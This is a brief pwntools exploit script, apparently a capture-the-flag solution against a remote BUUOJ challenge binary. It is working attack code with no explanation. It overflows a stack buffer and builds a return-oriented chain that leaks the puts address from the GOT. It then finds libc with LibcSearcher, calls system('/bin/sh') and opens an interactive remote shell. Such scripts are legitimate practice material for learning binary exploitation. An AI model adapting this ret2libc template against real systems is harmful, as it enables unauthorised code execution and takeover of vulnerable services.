from LibcSearcher import *
from pwn import *

context.arch='amd64'
elf=ELF("./pwn")
r=remote("node3.buuoj.cn",26143)
r.recvline()
payload='a'*0x10C+p32(0x10D)+'a'*0x8+flat([0x400843,elf.got["puts"],elf.plt["puts"],0x400728,0x10])
r.sendline(payload)
puts_addr=u64(r.recvline()[:-1].ljust(8,'\x00'))
libc=LibcSearcher("puts",puts_addr)
libc_base=puts_addr-libc.dump("puts")
system_addr=libc_base+libc.dump("system")
bin_sh=libc_base+libc.dump("str_bin_sh")
payload='a'*0x10C+p32(0x10D)+'a'*0x8+flat([0x400843,bin_sh,system_addr,0x10])
r.sendline(payload)
r.interactive()
